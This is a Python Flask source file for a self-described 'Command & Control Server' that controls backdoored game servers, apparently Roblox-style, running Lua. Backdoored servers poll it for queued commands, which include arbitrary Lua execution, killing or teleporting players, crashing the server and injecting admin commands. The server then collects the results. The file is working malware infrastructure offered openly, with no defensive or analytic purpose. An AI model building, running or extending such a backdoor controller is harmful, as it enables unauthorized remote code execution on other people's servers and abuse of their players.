#!/usr/bin/env python3
"""
Project Nexus - Command & Control Server
Remote command execution server for serverside backdoors
"""

import json
import uuid
import time
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import queue

app = Flask(__name__)
CORS(app)

# Session management
active_sessions = {}
command_queues = {}
execution_results = {}

class Session:
    def __init__(self, session_id, auth_key, game_id, job_id):
        self.session_id = session_id
        self.auth_key = auth_key
        self.game_id = game_id
        self.job_id = job_id
        self.connected_at = time.time()
        self.last_heartbeat = time.time()
        self.commands_executed = 0
        self.active = True
        
    def to_dict(self):
        return {
            'session_id': self.session_id,
            'game_id': self.game_id,
            'job_id': self.job_id,
            'connected_at': self.connected_at,
            'last_heartbeat': self.last_heartbeat,
            'commands_executed': self.commands_executed,
            'active': self.active
        }

# Authentication middleware
def require_auth(func):
    def wrapper(*args, **kwargs):
        data = request.get_json() if request.method == 'POST' else {}
        session_id = data.get('sessionId') or request.args.get('session')
        auth_key = data.get('authKey') or request.args.get('auth')
        
        if not session_id or not auth_key:
            return jsonify({'success': False, 'error': 'Missing credentials'}), 401
        
        session = active_sessions.get(session_id)
        if not session or session.auth_key != auth_key:
            return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
        
        return func(session, *args, **kwargs)
    
    wrapper.__name__ = func.__name__
    return wrapper

@app.route('/connect', methods=['POST'])
def connect():
    """Establish new session connection"""
    data = request.get_json()
    
    session_id = data.get('sessionId')
    auth_key = data.get('authKey')
    game_id = data.get('gameId')
    job_id = data.get('jobId')
    
    if not all([session_id, auth_key, game_id, job_id]):
        return jsonify({'success': False, 'error': 'Missing parameters'}), 400
    
    # Create new session
    session = Session(session_id, auth_key, game_id, job_id)
    active_sessions[session_id] = session
    command_queues[session_id] = queue.Queue()
    
    print(f"[+] New connection: {session_id} (Game: {game_id}, Job: {job_id})")
    
    return jsonify({
        'success': True,
        'sessionId': session_id,
        'message': 'Connected successfully'
    })

@app.route('/disconnect', methods=['POST'])
@require_auth
def disconnect(session):
    """Disconnect session"""
    session.active = False
    print(f"[-] Disconnected: {session.session_id}")
    
    return jsonify({'success': True, 'message': 'Disconnected'})

@app.route('/heartbeat', methods=['POST'])
@require_auth
def heartbeat(session):
    """Update session heartbeat"""
    session.last_heartbeat = time.time()
    return jsonify({'success': True})

@app.route('/poll', methods=['GET'])
@require_auth
def poll(session):
    """Poll for pending commands"""
    session_id = session.session_id
    
    if session_id not in command_queues:
        return jsonify([])
    
    commands = []
    q = command_queues[session_id]
    
    # Get all pending commands
    while not q.empty():
        try:
            cmd = q.get_nowait()
            commands.append(cmd)
        except queue.Empty:
            break
    
    return jsonify(commands)

@app.route('/execute', methods=['POST'])
@require_auth
def execute(session):
    """Queue command for execution"""
    data = request.get_json()
    command = data.get('command')
    
    if not command:
        return jsonify({'success': False, 'error': 'No command provided'}), 400
    
    cmd_id = str(uuid.uuid4())
    cmd_data = {
        'id': cmd_id,
        'type': 'execute',
        'code': command,
        'timestamp': time.time()
    }
    
    # Queue command
    command_queues[session.session_id].put(cmd_data)
    session.commands_executed += 1
    
    print(f"[*] Queued command {cmd_id} for session {session.session_id}")
    
    return jsonify({
        'success': True,
        'commandId': cmd_id,
        'message': 'Command queued'
    })

@app.route('/result', methods=['POST'])
@require_auth
def result(session):
    """Receive execution result"""
    data = request.get_json()
    
    cmd_id = data.get('commandId')
    success = data.get('success')
    result_data = data.get('result')
    
    execution_results[cmd_id] = {
        'success': success,
        'result': result_data,
        'timestamp': time.time()
    }
    
    print(f"[*] Result received for command {cmd_id}: {'SUCCESS' if success else 'FAILED'}")
    
    return jsonify({'success': True})

@app.route('/sessions', methods=['GET'])
def list_sessions():
    """List all active sessions"""
    sessions = [s.to_dict() for s in active_sessions.values() if s.active]
    return jsonify({
        'sessions': sessions,
        'count': len(sessions)
    })

@app.route('/session/<session_id>', methods=['GET'])
def get_session(session_id):
    """Get specific session info"""
    session = active_sessions.get(session_id)
    if not session:
        return jsonify({'error': 'Session not found'}), 404
    
    return jsonify(session.to_dict())

# Command interface endpoints
@app.route('/cmd/kill', methods=['POST'])
def cmd_kill():
    """Kill player command"""
    data = request.get_json()
    session_id = data.get('sessionId')
    target = data.get('target')
    
    if not session_id or session_id not in command_queues:
        return jsonify({'error': 'Invalid session'}), 400
    
    cmd_id = str(uuid.uuid4())
    command_queues[session_id].put({
        'id': cmd_id,
        'type': 'kill',
        'target': target,
        'timestamp': time.time()
    })
    
    return jsonify({'success': True, 'commandId': cmd_id})

@app.route('/cmd/teleport', methods=['POST'])
def cmd_teleport():
    """Teleport player command"""
    data = request.get_json()
    session_id = data.get('sessionId')
    target = data.get('target')
    position = data.get('position')
    
    if not session_id or session_id not in command_queues:
        return jsonify({'error': 'Invalid session'}), 400
    
    cmd_id = str(uuid.uuid4())
    command_queues[session_id].put({
        'id': cmd_id,
        'type': 'teleport',
        'target': target,
        'position': position,
        'timestamp': time.time()
    })
    
    return jsonify({'success': True, 'commandId': cmd_id})

@app.route('/cmd/crash', methods=['POST'])
def cmd_crash():
    """Crash server command"""
    data = request.get_json()
    session_id = data.get('sessionId')
    method = data.get('method', 'memory')
    
    if not session_id or session_id not in command_queues:
        return jsonify({'error': 'Invalid session'}), 400
    
    cmd_id = str(uuid.uuid4())
    command_queues[session_id].put({
        'id': cmd_id,
        'type': 'crash',
        'method': method,
        'timestamp': time.time()
    })
    
    return jsonify({'success': True, 'commandId': cmd_id})

@app.route('/cmd/admin', methods=['POST'])
def cmd_admin():
    """Inject admin commands"""
    data = request.get_json()
    session_id = data.get('sessionId')
    
    if not session_id or session_id not in command_queues:
        return jsonify({'error': 'Invalid session'}), 400
    
    cmd_id = str(uuid.uuid4())
    command_queues[session_id].put({
        'id': cmd_id,
        'type': 'admin',
        'timestamp': time.time()
    })
    
    return jsonify({'success': True, 'commandId': cmd_id})

@app.route('/cmd/custom', methods=['POST'])
def cmd_custom():
    """Execute custom Lua code"""
    data = request.get_json()
    session_id = data.get('sessionId')
    code = data.get('code')
    
    if not session_id or session_id not in command_queues:
        return jsonify({'error': 'Invalid session'}), 400
    
    cmd_id = str(uuid.uuid4())
    command_queues[session_id].put({
        'id': cmd_id,
        'type': 'execute',
        'code': code,
        'timestamp': time.time()
    })
    
    return jsonify({'success': True, 'commandId': cmd_id})

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'online',
        'active_sessions': len([s for s in active_sessions.values() if s.active]),
        'total_sessions': len(active_sessions),
        'uptime': time.time()
    })

# Cleanup dead sessions periodically
def cleanup_sessions():
    while True:
        time.sleep(60)
        now = time.time()
        dead_sessions = []
        
        for session_id, session in active_sessions.items():
            if now - session.last_heartbeat > 120:  # 2 minutes timeout
                session.active = False
                dead_sessions.append(session_id)
        
        for session_id in dead_sessions:
            print(f"[!] Session timeout: {session_id}")

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
cleanup_thread.start()

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════╗
    ║       PROJECT NEXUS C&C SERVER v1.0           ║
    ║                                               ║
    ║  Listening on: http://0.0.0.0:8080           ║
    ║                                               ║
    ║  Endpoints:                                   ║
    ║    /connect   - Establish session             ║
    ║    /poll      - Get commands                  ║
    ║    /execute   - Queue command                 ║
    ║    /sessions  - List sessions                 ║
    ║    /cmd/*     - Command interface             ║
    ╚═══════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
